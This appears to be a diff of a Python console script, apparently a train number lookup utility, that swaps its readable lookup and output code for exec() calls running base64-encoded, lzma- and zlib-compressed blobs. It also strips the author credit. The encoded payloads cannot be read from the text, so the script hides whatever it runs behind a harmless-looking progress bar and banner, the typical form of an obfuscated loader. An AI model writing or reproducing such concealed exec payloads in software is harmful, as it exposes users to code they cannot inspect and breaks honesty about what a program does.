@@ -3,12 +3,13 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
+
 import requests as r
 import os, sys, json, time
 from os import system
 from sys import exit
-import zlib, base64
-
+import lzma, base64, zlib
+###################################################
 os.system("cls" if os.name == "nt" else "clear")
 def load_animation():
 
@@ -35,7 +36,6 @@ def load_animation():
         sys.stdout.write("\r" + res + animation[anicount])
         sys.stdout.flush()
         load_str = res
-
         anicount = (anicount + 1) % 4
         i = (i + 1) % ls_len
         counttime = counttime + 1
@@ -43,12 +43,10 @@ def load_animation():
         os.system("cls")
     else:
         os.system("clear")
-
 if __name__ == "__main__":
     load_animation()
 os.system("cls" if os.name == "nt" else "clear")
-exec(zlib.decompress(base64.b64decode('eJwdyzEOwjAMBdCdY3SCJa4cAwoSt2BHn9RJAzRFiQXXR7C95eHcXFbbDrPZq5+IGj5xqi4XmxEfLq4L/VBqfpcnyBpKvU4w3NCVZIQXf9ynCGWVwP6QonhRBnPSUZihwQe6/F/Fot3d+1qH3eYLSngo3Q==')))
-b = a.json()
+exec(lzma.decompress(base64.b64decode('/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4ACFAHldADCPSkMBCxlJkqTUolf17TgEP70C+F+2Q8Gn/S7h+QXF9ie4EGIi/ED0iuw0GzdzbMzhU7YxTJnOQRD/suD55jq0JmjLsRFhWCQi6haicCH4TJQVkTzoEsn3wgpmElBPLQTazraJC9MUNWOtrtYVD5UtzdF2L1dDJgAAAAAA0vLTG6OHavcAAZUBhgEAAE35bnqxxGf7AgAAAAAEWVo=')))
 class banner2:
     def __init__(self):
         pass
@@ -79,8 +77,6 @@ def process_bar():
     os.system("cls" if os.name == "nt" else "clear")
     print("\n\n\n\n\n\t\t\t  Searching Please WAIT...  ")
     print("\n\n\n\n")
-
-    # animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
     animation = [
         "[■□□□□□□□□□]",
         "[■■□□□□□□□□]",
@@ -93,21 +89,12 @@ def process_bar():
         "[■■■■■■■■■□]",
         "[■■■■■■■■■■]",
     ]
-
     for i in range(len(animation)):
         time.sleep(0.2)
         sys.stdout.write("\r\t\t\t\t" + animation[i % len(animation)])
         sys.stdout.flush()
     print("\n")
 process_bar()
-os.system("cls" if os.name == "nt" else "clear")
-print("\n\n\n")
-try:
-    print("\n\tYour train Number/Name:  " + b[f"{xy}"])
-except KeyError:
-    print("    Sorry, " + os.getlogin() + " try again")
-print("\n\n\n\n\n\n\n\n")
-input("\t[ Press ENTER for exit ]")
-os.system("cls" if os.name == "nt" else "clear")
+exec(zlib.decompress(base64.b64decode('eJyVT7EKwkAM3e8rQqYWRXfhxk5CFXURdaiSloPrXcml0EP8d1NEnM3b3nt5eYlplXIS6gt8+ITgWohpFZqerMUgCOQTgWrUMJbG24FdELOzW8oVc2Qj1oVhFOMLvIYZahPOGwMfRs5xZBBuXIB67O/E61rjNwC4uF9afE75hbfS0PSgQWD3WQSdY2TOS7Vpo47Ex86FolyghmVoOg2cG33P/jAXUFYusGdKCar6VB2gjQw0OYGb6vG/t9+hu12Z')))
 
-# Made by HackingVila (Aniket)
+
